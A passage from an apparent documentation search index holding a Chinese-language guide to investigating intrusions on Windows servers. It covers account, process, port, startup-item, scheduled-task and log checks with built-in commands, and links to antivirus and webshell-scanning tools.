2\u3001\u67e5\u627e\u53ef\u7591\u76ee\u5f55\u53ca\u6587\u4ef6 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001 \u67e5\u770b\u7528\u6237\u76ee\u5f55\uff0c\u65b0\u5efa\u8d26\u53f7\u4f1a\u5728\u8fd9\u4e2a\u76ee\u5f55\u751f\u6210\u4e00\u4e2a\u7528\u6237\u76ee\u5f55\uff0c\u67e5\u770b\u662f\u5426\u6709\u65b0\u5efa\u7528\u6237\u76ee\u5f55\u3002 Window 2003\u7248\u672c C:\\Documents and Settings Window 2008R2\u53ca\u4ee5\u540e\u7248\u672c C:\\Users\\ b\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 %UserProfile%\\Recent \uff0c\u5206\u6790\u6700\u8fd1\u6253\u5f00\u5206\u6790\u53ef\u7591\u6587\u4ef6\u3002 c\u3001\u5728\u670d\u52a1\u5668\u5404\u4e2a\u76ee\u5f55\uff0c\u53ef\u6839\u636e\u6587\u4ef6\u5939\u5185\u6587\u4ef6\u5217\u8868\u65f6\u95f4\u8fdb\u884c\u6392\u5e8f\uff0c\u67e5\u627e\u53ef\u7591\u6587\u4ef6\u3002 d\u3001\u56de\u6536\u7ad9\u3001\u6d4f\u89c8\u5668\u4e0b\u8f7d\u76ee\u5f55\u3001\u6d4f\u89c8\u5668\u5386\u53f2\u8bb0\u5f55 e\u3001\u4fee\u6539\u65f6\u95f4\u5728\u521b\u5efa\u65f6\u95f4\u4e4b\u524d\u7684\u4e3a\u53ef\u7591\u6587\u4ef6 3\u3001\u53d1\u73b0\u5e76\u5f97\u5230 WebShell\u3001\u8fdc\u63a7\u6728\u9a6c\u7684\u521b\u5efa\u65f6\u95f4\uff0c\u5982\u4f55\u627e\u51fa\u540c\u4e00\u65f6\u95f4\u8303\u56f4\u5185\u521b\u5efa\u7684\u6587\u4ef6\uff1f a\u3001\u5229\u7528 Registry Workshop \u6ce8\u518c\u8868\u7f16\u8f91\u5668\u7684\u641c\u7d22\u529f\u80fd\uff0c\u53ef\u4ee5\u627e\u5230\u6700\u540e\u5199\u5165\u65f6\u95f4\u533a\u95f4\u7684\u6587\u4ef6\u3002 b\u3001\u5229\u7528\u8ba1\u7b97\u673a\u81ea\u5e26\u6587\u4ef6\u641c\u7d22\u529f\u80fd\uff0c\u6307\u5b9a\u4fee\u6539\u65f6\u95f4\u8fdb\u884c\u641c\u7d22\u3002 1.5 \u81ea\u52a8\u5316\u67e5\u6740 \u00b6 \u75c5\u6bd2\u67e5\u6740 \u68c0\u67e5\u65b9\u6cd5\uff1a\u4e0b\u8f7d\u5b89\u5168\u8f6f\u4ef6\uff0c\u66f4\u65b0\u6700\u65b0\u75c5\u6bd2\u5e93\uff0c\u8fdb\u884c\u5168\u76d8\u626b\u63cf\u3002 webshell\u67e5\u6740 \u68c0\u67e5\u65b9\u6cd5\uff1a\u9009\u62e9\u5177\u4f53\u7ad9\u70b9\u8def\u5f84\u8fdb\u884cwebshell\u67e5\u6740\uff0c\u5efa\u8bae\u4f7f\u7528\u4e24\u6b3e WebShell \u67e5\u6740\u5de5\u5177\u540c\u65f6\u67e5\u6740\uff0c\u53ef\u76f8\u4e92\u8865\u5145\u89c4\u5219\u5e93\u7684\u4e0d\u8db3\u3002 1.6 \u65e5\u5fd7\u5206\u6790 \u00b6 \u7cfb\u7edf\u65e5\u5fd7 \u5206\u6790\u65b9\u6cd5\uff1a a\u3001\u524d\u63d0\uff1a\u5f00\u542f\u5ba1\u6838\u7b56\u7565\uff0c\u82e5\u65e5\u540e\u7cfb\u7edf\u51fa\u73b0\u6545\u969c\u3001\u5b89\u5168\u4e8b\u6545\u5219\u53ef\u4ee5\u67e5\u770b\u7cfb\u7edf\u7684\u65e5\u5fd7\u6587\u4ef6\uff0c\u6392\u9664\u6545\u969c\uff0c\u8ffd\u67e5\u5165\u4fb5\u8005\u7684\u4fe1\u606f\u7b49\u3002 b\u3001Win+R \u6253\u5f00\u8fd0\u884c\uff0c\u8f93\u5165 \"eventvwr.msc\"\uff0c\u56de\u8f66\u8fd0\u884c\uff0c\u6253\u5f00\"\u4e8b\u4ef6\u67e5\u770b\u5668\"\u3002 C\u3001\u5bfc\u51fa\u5e94\u7528\u7a0b\u5e8f\u65e5\u5fd7\u3001\u5b89\u5168\u65e5\u5fd7\u3001\u7cfb\u7edf\u65e5\u5fd7\uff0c\u5229\u7528 Log Parser \u8fdb\u884c\u5206\u6790\u3002 Web \u8bbf\u95ee\u65e5\u5fd7 \u5206\u6790\u65b9\u6cd5\uff1a a\u3001\u627e\u5230\u4e2d\u95f4\u4ef6\u7684web\u65e5\u5fd7\uff0c\u6253\u5305\u5230\u672c\u5730\u65b9\u4fbf\u8fdb\u884c\u5206\u6790\u3002 b\u3001\u63a8\u8350\u5de5\u5177\uff1aWindows \u4e0b\uff0c\u63a8\u8350\u7528 EmEditor \u8fdb\u884c\u65e5\u5fd7\u5206\u6790\uff0c\u652f\u6301\u5927\u6587\u672c\uff0c\u641c\u7d22\u6548\u7387\u8fd8\u4e0d\u9519\u3002Linux \u4e0b\uff0c\u4f7f\u7528 Shell \u547d\u4ee4\u7ec4\u5408\u67e5\u8be2\u5206\u6790\u3002 0x02 \u5de5\u5177\u7bc7 \u00b6 2.1 \u75c5\u6bd2\u5206\u6790 \u00b6 PCHunter\uff1a http://www.xuetr.com \u706b\u7ed2\u5251\uff1a https://www.huorong.cn Process Explorer\uff1a https://docs.microsoft.com/zh-cn/sysinternals/downloads/process-explorer processhacker\uff1a https://processhacker.sourceforge.io/downloads.php autoruns\uff1a https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns OTL\uff1a https://www.bleepingcomputer.com/download/otl/ SysInspector\uff1a http://download.eset.com.cn/download/detail/?product=sysinspector 2.2 \u75c5\u6bd2\u67e5\u6740 \u00b6 \u5361\u5df4\u65af\u57fa\uff1a http://devbuilds.kaspersky-labs.com/devbuilds/KVRT/latest/full/KVRT.exe \uff08\u63a8\u8350\u7406\u7531\uff1a\u7eff\u8272\u7248\u3001\u6700\u65b0\u75c5\u6bd2\u5e93\uff09 \u5927\u8718\u86db\uff1a http://free.drweb.ru/download+cureit+free \uff08\u63a8\u8350\u7406\u7531\uff1a\u626b\u63cf\u5feb\u3001\u4e00\u6b21\u4e0b\u8f7d\u53ea\u80fd\u75281\u5468\uff0c\u66f4\u65b0\u75c5\u6bd2\u5e93\uff09 \u706b\u7ed2\u5b89\u5168\u8f6f\u4ef6\uff1a https://www.huorong.cn 360\u6740\u6bd2\uff1a http://sd.360.cn/download_center.html 2.3 \u75c5\u6bd2\u52a8\u6001 \u00b6 CVERC-\u56fd\u5bb6\u8ba1\u7b97\u673a\u75c5\u6bd2\u5e94\u6025\u5904\u7406\u4e2d\u5fc3\uff1a http://www.cverc.org.cn \u5fae\u6b65\u5728\u7ebf\u5a01\u80c1\u60c5\u62a5\u793e\u533a\uff1a https://x.threatbook.cn \u706b\u7ed2\u5b89\u5168\u8bba\u575b\uff1a http://bbs.huorong.cn/forum-59-1.html \u7231\u6bd2\u9738\u793e\u533a\uff1a http://bbs.duba.net \u817e\u8baf\u7535\u8111\u7ba1\u5bb6\uff1a http://bbs.guanjia.qq.com/forum-2-1.html 2.4 \u5728\u7ebf\u75c5\u6bd2\u626b\u63cf\u7f51\u7ad9 \u00b6 Virustotal\uff1a https://www.virustotal.com Virscan\uff1a http://www.virscan.org \u817e\u8baf\u54c8\u52c3\u5206\u6790\u7cfb\u7edf\uff1a https://habo.qq.com Jotti \u6076\u610f\u8f6f\u4ef6\u626b\u63cf\u7cfb\u7edf\uff1a https://virusscan.jotti.org 2.5 webshell\u67e5\u6740 \u00b6 D\u76fe_Web\u67e5\u6740\uff1a http://www.d99net.net/index.asp \u6cb3\u9a6c WebShell \u67e5\u6740\uff1a http://www.shellpub.com","title":"\u7b2c1\u7bc7\uff1aWindows \u5165\u4fb5\u6392\u67e5"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#\u7b2c1\u7bc7windows-\u5165\u4fb5\u6392\u67e5","text":"","title":"\u7b2c1\u7bc7\uff1awindows \u5165\u4fb5\u6392\u67e5"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#0x00-\u524d\u8a00","text":"\u5f53\u4f01\u4e1a\u53d1\u751f\u9ed1\u5ba2\u5165\u4fb5\u3001\u7cfb\u7edf\u5d29\u6e83\u6216\u5176\u5b83\u5f71\u54cd\u4e1a\u52a1\u6b63\u5e38\u8fd0\u884c\u7684\u5b89\u5168\u4e8b\u4ef6\u65f6\uff0c\u6025\u9700\u7b2c\u4e00\u65f6\u95f4\u8fdb\u884c\u5904\u7406\uff0c\u4f7f\u4f01\u4e1a\u7684\u7f51\u7edc\u4fe1\u606f\u7cfb\u7edf\u5728\u6700\u77ed\u65f6\u95f4\u5185\u6062\u590d\u6b63\u5e38\u5de5\u4f5c\uff0c\u8fdb\u4e00\u6b65\u67e5\u627e\u5165\u4fb5\u6765\u6e90\uff0c\u8fd8\u539f\u5165\u4fb5\u4e8b\u6545\u8fc7\u7a0b\uff0c\u540c\u65f6\u7ed9\u51fa\u89e3\u51b3\u65b9\u6848\u4e0e\u9632\u8303\u63aa\u65bd\uff0c\u4e3a\u4f01\u4e1a\u633d\u56de\u6216\u51cf\u5c11\u7ecf\u6d4e\u635f\u5931\u3002 \u5e38\u89c1\u7684\u5e94\u6025\u54cd\u5e94\u4e8b\u4ef6\u5206\u7c7b\uff1a Web \u5165\u4fb5\uff1a\u7f51\u9875\u6302\u9a6c\u3001\u4e3b\u9875\u7be1\u6539\u3001Webshell \u7cfb\u7edf\u5165\u4fb5\uff1a\u75c5\u6bd2\u6728\u9a6c\u3001\u52d2\u7d22\u8f6f\u4ef6\u3001\u8fdc\u63a7\u540e\u95e8 \u7f51\u7edc\u653b\u51fb\uff1aDDOS \u653b\u51fb\u3001DNS \u52ab\u6301\u3001ARP \u6b3a\u9a97 \u9488\u5bf9\u5e38\u89c1\u7684\u653b\u51fb\u4e8b\u4ef6\uff0c\u7ed3\u5408\u5de5\u4f5c\u4e2d\u5e94\u6025\u54cd\u5e94\u4e8b\u4ef6\u5206\u6790\u548c\u89e3\u51b3\u7684\u65b9\u6cd5\uff0c\u603b\u7ed3\u4e86\u4e00\u4e9b Windows \u670d\u52a1\u5668\u5165\u4fb5\u6392\u67e5\u7684\u601d\u8def\u3002","title":"0x00 \u524d\u8a00"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#0x01-\u5165\u4fb5\u6392\u67e5\u601d\u8def","text":"","title":"0x01 \u5165\u4fb5\u6392\u67e5\u601d\u8def"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#11-\u68c0\u67e5\u7cfb\u7edf\u8d26\u53f7\u5b89\u5168","text":"1\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u6709\u5f31\u53e3\u4ee4\uff0c\u8fdc\u7a0b\u7ba1\u7406\u7aef\u53e3\u662f\u5426\u5bf9\u516c\u7f51\u5f00\u653e\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a\u636e\u5b9e\u9645\u60c5\u51b5\u54a8\u8be2\u76f8\u5173\u670d\u52a1\u5668\u7ba1\u7406\u5458\u3002 2\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728\u53ef\u7591\u8d26\u53f7\u3001\u65b0\u589e\u8d26\u53f7\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a\u6253\u5f00 cmd \u7a97\u53e3\uff0c\u8f93\u5165 lusrmgr.msc \u547d\u4ee4\uff0c\u67e5\u770b\u662f\u5426\u6709\u65b0\u589e/\u53ef\u7591\u7684\u8d26\u53f7\uff0c\u5982\u6709\u7ba1\u7406\u5458\u7fa4\u7ec4\u7684\uff08Administrators\uff09\u91cc\u7684\u65b0\u589e\u8d26\u6237\uff0c\u5982\u6709\uff0c\u8bf7\u7acb\u5373\u7981\u7528\u6216\u5220\u9664\u6389\u3002 3\u3001\u67e5\u770b\u670d\u52a1\u5668\u662f\u5426\u5b58\u5728\u9690\u85cf\u8d26\u53f7\u3001\u514b\u9686\u8d26\u53f7\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u6253\u5f00\u6ce8\u518c\u8868 \uff0c\u67e5\u770b\u7ba1\u7406\u5458\u5bf9\u5e94\u952e\u503c\u3002 b\u3001\u4f7f\u7528D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u96c6\u6210\u4e86\u5bf9\u514b\u9686\u8d26\u53f7\u68c0\u6d4b\u7684\u529f\u80fd\u3002 4\u3001\u7ed3\u5408\u65e5\u5fd7\uff0c\u67e5\u770b\u7ba1\u7406\u5458\u767b\u5f55\u65f6\u95f4\u3001\u7528\u6237\u540d\u662f\u5426\u5b58\u5728\u5f02\u5e38\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001Win+R \u6253\u5f00\u8fd0\u884c\uff0c\u8f93\u5165\"eventvwr.msc\"\uff0c\u56de\u8f66\u8fd0\u884c\uff0c\u6253\u5f00\u201c\u4e8b\u4ef6\u67e5\u770b\u5668\u201d\u3002 b\u3001\u5bfc\u51fa Windows \u65e5\u5fd7 -- \u5b89\u5168\uff0c\u5229\u7528\u5fae\u8f6f\u5b98\u65b9\u5de5\u5177 Log Parser \u8fdb\u884c\u5206\u6790\u3002","title":"1.1 \u68c0\u67e5\u7cfb\u7edf\u8d26\u53f7\u5b89\u5168"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#12-\u68c0\u67e5\u5f02\u5e38\u7aef\u53e3\u8fdb\u7a0b","text":"1\u3001\u68c0\u67e5\u7aef\u53e3\u8fde\u63a5\u60c5\u51b5\uff0c\u662f\u5426\u6709\u8fdc\u7a0b\u8fde\u63a5\u3001\u53ef\u7591\u8fde\u63a5\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u4f7f\u7528 netstat -ano \u547d\u4ee4\u67e5\u770b\u76ee\u524d\u7684\u7f51\u7edc\u8fde\u63a5\uff0c\u5b9a\u4f4d\u53ef\u7591\u7684 ESTABLISHED b\u3001\u6839\u636e netstat \u547d\u4ee4\u5b9a\u4f4d\u51fa\u7684 PID \u7f16\u53f7\uff0c\u518d\u901a\u8fc7 tasklist \u547d\u4ee4\u8fdb\u884c\u8fdb\u7a0b\u5b9a\u4f4d tasklist | findstr \"PID\" 2\u3001\u8fdb\u7a0b \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u5f00\u59cb -- \u8fd0\u884c -- \u8f93\u5165 msinfo32 \u547d\u4ee4\uff0c\u4f9d\u6b21\u70b9\u51fb \"\u8f6f\u4ef6\u73af\u5883 -- \u6b63\u5728\u8fd0\u884c\u4efb\u52a1\" \u5c31\u53ef\u4ee5\u67e5\u770b\u5230\u8fdb\u7a0b\u7684\u8be6\u7ec6\u4fe1\u606f\uff0c\u6bd4\u5982\u8fdb\u7a0b\u8def\u5f84\u3001\u8fdb\u7a0bID\u3001\u6587\u4ef6\u521b\u5efa\u65e5\u671f\u4ee5\u53ca\u542f\u52a8\u65f6\u95f4\u7b49\u3002 b\u3001\u6253\u5f00D\u76fe_web\u67e5\u6740\u5de5\u5177\uff0c\u8fdb\u7a0b\u67e5\u770b\uff0c\u5173\u6ce8\u6ca1\u6709\u7b7e\u540d\u4fe1\u606f\u7684\u8fdb\u7a0b\u3002 c\u3001\u901a\u8fc7\u5fae\u8f6f\u5b98\u65b9\u63d0\u4f9b\u7684 Process Explorer \u7b49\u5de5\u5177\u8fdb\u884c\u6392\u67e5 \u3002 d\u3001\u67e5\u770b\u53ef\u7591\u7684\u8fdb\u7a0b\u53ca\u5176\u5b50\u8fdb\u7a0b\u3002\u53ef\u4ee5\u901a\u8fc7\u89c2\u5bdf\u4ee5\u4e0b\u5185\u5bb9\uff1a \u6ca1\u6709\u7b7e\u540d\u9a8c\u8bc1\u4fe1\u606f\u7684\u8fdb\u7a0b \u6ca1\u6709\u63cf\u8ff0\u4fe1\u606f\u7684\u8fdb\u7a0b \u8fdb\u7a0b\u7684\u5c5e\u4e3b \u8fdb\u7a0b\u7684\u8def\u5f84\u662f\u5426\u5408\u6cd5 CPU \u6216\u5185\u5b58\u8d44\u6e90\u5360\u7528\u957f\u65f6\u95f4\u8fc7\u9ad8\u7684\u8fdb\u7a0b 3\u3001\u5c0f\u6280\u5de7\uff1a \u200b a\u3001\u67e5\u770b\u7aef\u53e3\u5bf9\u5e94\u7684 PID\uff1a netstat -ano | findstr \"port\" \u200b b\u3001\u67e5\u770b\u8fdb\u7a0b\u5bf9\u5e94\u7684 PID\uff1a\u4efb\u52a1\u7ba1\u7406\u5668 -- \u67e5\u770b -- \u9009\u62e9\u5217 -- PID \u6216\u8005 tasklist | findstr \"PID\" \u200b c\u3001\u67e5\u770b\u8fdb\u7a0b\u5bf9\u5e94\u7684\u7a0b\u5e8f\u4f4d\u7f6e\uff1a \u200b \u4efb\u52a1\u7ba1\u7406\u5668 -- \u9009\u62e9\u5bf9\u5e94\u8fdb\u7a0b -- \u53f3\u952e\u6253\u5f00\u6587\u4ef6\u4f4d\u7f6e \u200b \u8fd0\u884c\u8f93\u5165 wmic \uff0ccmd \u754c\u9762\u8f93\u5165 process \u200b d\u3001 tasklist /svc \u8fdb\u7a0b -- PID -- \u670d\u52a1 \u200b e\u3001\u67e5\u770bWindows\u670d\u52a1\u6240\u5bf9\u5e94\u7684\u7aef\u53e3\uff1a \u200b %systemroot%/system32/drivers/etc/services\uff08\u4e00\u822c %systemroot% \u5c31\u662f C:\\Windows \u8def\u5f84\uff09","title":"1.2 \u68c0\u67e5\u5f02\u5e38\u7aef\u53e3\u3001\u8fdb\u7a0b"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#13-\u68c0\u67e5\u542f\u52a8\u9879\u8ba1\u5212\u4efb\u52a1\u670d\u52a1","text":"1\u3001\u68c0\u67e5\u670d\u52a1\u5668\u662f\u5426\u6709\u5f02\u5e38\u7684\u542f\u52a8\u9879\u3002 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u767b\u5f55\u670d\u52a1\u5668\uff0c\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u6240\u6709\u7a0b\u5e8f\u3011>\u3010\u542f\u52a8\u3011\uff0c\u9ed8\u8ba4\u60c5\u51b5\u4e0b\u6b64\u76ee\u5f55\u5728\u662f\u4e00\u4e2a\u7a7a\u76ee\u5f55\uff0c\u786e\u8ba4\u662f\u5426\u6709\u975e\u4e1a\u52a1\u7a0b\u5e8f\u5728\u8be5\u76ee\u5f55\u4e0b\u3002 b\u3001\u5355\u51fb\u5f00\u59cb\u83dc\u5355 >\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 msconfig \uff0c\u67e5\u770b\u662f\u5426\u5b58\u5728\u547d\u540d\u5f02\u5e38\u7684\u542f\u52a8\u9879\u76ee\uff0c\u662f\u5219\u53d6\u6d88\u52fe\u9009\u547d\u540d\u5f02\u5e38\u7684\u542f\u52a8\u9879\u76ee\uff0c\u5e76\u5230\u547d\u4ee4\u4e2d\u663e\u793a\u7684\u8def\u5f84\u5220\u9664\u6587\u4ef6\u3002 c\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 regedit\uff0c\u6253\u5f00\u6ce8\u518c\u8868\uff0c\u67e5\u770b\u5f00\u673a\u542f\u52a8\u9879\u662f\u5426\u6b63\u5e38\uff0c\u7279\u522b\u6ce8\u610f\u5982\u4e0b\u4e09\u4e2a\u6ce8\u518c\u8868\u9879\uff1a HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Run HKEY_LOCAL_MACHINE\\Software\\Microsoft\\Windows\\CurrentVersion\\Runonce \u68c0\u67e5\u53f3\u4fa7\u662f\u5426\u6709\u542f\u52a8\u5f02\u5e38\u7684\u9879\u76ee\uff0c\u5982\u6709\u8bf7\u5220\u9664\uff0c\u5e76\u5efa\u8bae\u5b89\u88c5\u6740\u6bd2\u8f6f\u4ef6\u8fdb\u884c\u75c5\u6bd2\u67e5\u6740\uff0c\u6e05\u9664\u6b8b\u7559\u75c5\u6bd2\u6216\u6728\u9a6c\u3002 d\u3001\u5229\u7528\u5b89\u5168\u8f6f\u4ef6\u67e5\u770b\u542f\u52a8\u9879\u3001\u5f00\u673a\u65f6\u95f4\u7ba1\u7406\u7b49\u3002 e\u3001\u7ec4\u7b56\u7565\uff0c\u8fd0\u884c gpedit.msc 2\u3001\u68c0\u67e5\u8ba1\u5212\u4efb\u52a1 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8bbe\u7f6e\u3011>\u3010\u63a7\u5236\u9762\u677f\u3011>\u3010\u4efb\u52a1\u8ba1\u5212\u3011\uff0c\u67e5\u770b\u8ba1\u5212\u4efb\u52a1\u5c5e\u6027\uff0c\u4fbf\u53ef\u4ee5\u53d1\u73b0\u6728\u9a6c\u6587\u4ef6\u7684\u8def\u5f84\u3002 b\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff1b\u8f93\u5165 cmd \uff0c\u7136\u540e\u8f93\u5165 at \uff0c\u68c0\u67e5\u8ba1\u7b97\u673a\u4e0e\u7f51\u7edc\u4e0a\u7684\u5176\u5b83\u8ba1\u7b97\u673a\u4e4b\u95f4\u7684\u4f1a\u8bdd\u6216\u8ba1\u5212\u4efb\u52a1\uff0c\u5982\u6709\uff0c\u5219\u786e\u8ba4\u662f\u5426\u4e3a\u6b63\u5e38\u8fde\u63a5\u3002 3\u3001\u670d\u52a1\u81ea\u542f\u52a8 \u68c0\u67e5\u65b9\u6cd5\uff1a\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 services.msc \uff0c\u6ce8\u610f\u670d\u52a1\u72b6\u6001\u548c\u542f\u52a8\u7c7b\u578b\uff0c\u68c0\u67e5\u662f\u5426\u6709\u5f02\u5e38\u670d\u52a1\u3002","title":"1.3 \u68c0\u67e5\u542f\u52a8\u9879\u3001\u8ba1\u5212\u4efb\u52a1\u3001\u670d\u52a1"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#14-\u68c0\u67e5\u7cfb\u7edf\u76f8\u5173\u4fe1\u606f","text":"1\u3001\u67e5\u770b\u7cfb\u7edf\u7248\u672c\u4ee5\u53ca\u8865\u4e01\u4fe1\u606f \u68c0\u67e5\u65b9\u6cd5\uff1a\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 systeminfo \uff0c\u67e5\u770b\u7cfb\u7edf\u4fe1\u606f\u3002 2\u3001\u67e5\u627e\u53ef\u7591\u76ee\u5f55\u53ca\u6587\u4ef6 \u68c0\u67e5\u65b9\u6cd5\uff1a a\u3001 \u67e5\u770b\u7528\u6237\u76ee\u5f55\uff0c\u65b0\u5efa\u8d26\u53f7\u4f1a\u5728\u8fd9\u4e2a\u76ee\u5f55\u751f\u6210\u4e00\u4e2a\u7528\u6237\u76ee\u5f55\uff0c\u67e5\u770b\u662f\u5426\u6709\u65b0\u5efa\u7528\u6237\u76ee\u5f55\u3002 Window 2003\u7248\u672c C:\\Documents and Settings Window 2008R2\u53ca\u4ee5\u540e\u7248\u672c C:\\Users\\ b\u3001\u5355\u51fb\u3010\u5f00\u59cb\u3011>\u3010\u8fd0\u884c\u3011\uff0c\u8f93\u5165 %UserProfile%\\Recent \uff0c\u5206\u6790\u6700\u8fd1\u6253\u5f00\u5206\u6790\u53ef\u7591\u6587\u4ef6\u3002 c\u3001\u5728\u670d\u52a1\u5668\u5404\u4e2a\u76ee\u5f55\uff0c\u53ef\u6839\u636e\u6587\u4ef6\u5939\u5185\u6587\u4ef6\u5217\u8868\u65f6\u95f4\u8fdb\u884c\u6392\u5e8f\uff0c\u67e5\u627e\u53ef\u7591\u6587\u4ef6\u3002 d\u3001\u56de\u6536\u7ad9\u3001\u6d4f\u89c8\u5668\u4e0b\u8f7d\u76ee\u5f55\u3001\u6d4f\u89c8\u5668\u5386\u53f2\u8bb0\u5f55 e\u3001\u4fee\u6539\u65f6\u95f4\u5728\u521b\u5efa\u65f6\u95f4\u4e4b\u524d\u7684\u4e3a\u53ef\u7591\u6587\u4ef6 3\u3001\u53d1\u73b0\u5e76\u5f97\u5230 WebShell\u3001\u8fdc\u63a7\u6728\u9a6c\u7684\u521b\u5efa\u65f6\u95f4\uff0c\u5982\u4f55\u627e\u51fa\u540c\u4e00\u65f6\u95f4\u8303\u56f4\u5185\u521b\u5efa\u7684\u6587\u4ef6\uff1f a\u3001\u5229\u7528 Registry Workshop \u6ce8\u518c\u8868\u7f16\u8f91\u5668\u7684\u641c\u7d22\u529f\u80fd\uff0c\u53ef\u4ee5\u627e\u5230\u6700\u540e\u5199\u5165\u65f6\u95f4\u533a\u95f4\u7684\u6587\u4ef6\u3002 b\u3001\u5229\u7528\u8ba1\u7b97\u673a\u81ea\u5e26\u6587\u4ef6\u641c\u7d22\u529f\u80fd\uff0c\u6307\u5b9a\u4fee\u6539\u65f6\u95f4\u8fdb\u884c\u641c\u7d22\u3002","title":"1.4 \u68c0\u67e5\u7cfb\u7edf\u76f8\u5173\u4fe1\u606f"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#15-\u81ea\u52a8\u5316\u67e5\u6740","text":"\u75c5\u6bd2\u67e5\u6740 \u68c0\u67e5\u65b9\u6cd5\uff1a\u4e0b\u8f7d\u5b89\u5168\u8f6f\u4ef6\uff0c\u66f4\u65b0\u6700\u65b0\u75c5\u6bd2\u5e93\uff0c\u8fdb\u884c\u5168\u76d8\u626b\u63cf\u3002 webshell\u67e5\u6740 \u68c0\u67e5\u65b9\u6cd5\uff1a\u9009\u62e9\u5177\u4f53\u7ad9\u70b9\u8def\u5f84\u8fdb\u884cwebshell\u67e5\u6740\uff0c\u5efa\u8bae\u4f7f\u7528\u4e24\u6b3e WebShell \u67e5\u6740\u5de5\u5177\u540c\u65f6\u67e5\u6740\uff0c\u53ef\u76f8\u4e92\u8865\u5145\u89c4\u5219\u5e93\u7684\u4e0d\u8db3\u3002","title":"1.5 \u81ea\u52a8\u5316\u67e5\u6740"},{"location":"%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/%E7%AC%AC01%E7%AB%A0%EF%BC%9A%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5%E7%AF%87/%E7%AC%AC1%E7%AF%87%EF%BC%9AWindows%20%E5%85%A5%E4%BE%B5%E6%8E%92%E6%9F%A5/#16-\u65e5\u5fd7\u5206\u6790","text":"\u7cfb\u7edf\u65e5\u5fd7 \u5206\u6790\u65b9\u6cd5\uff1a 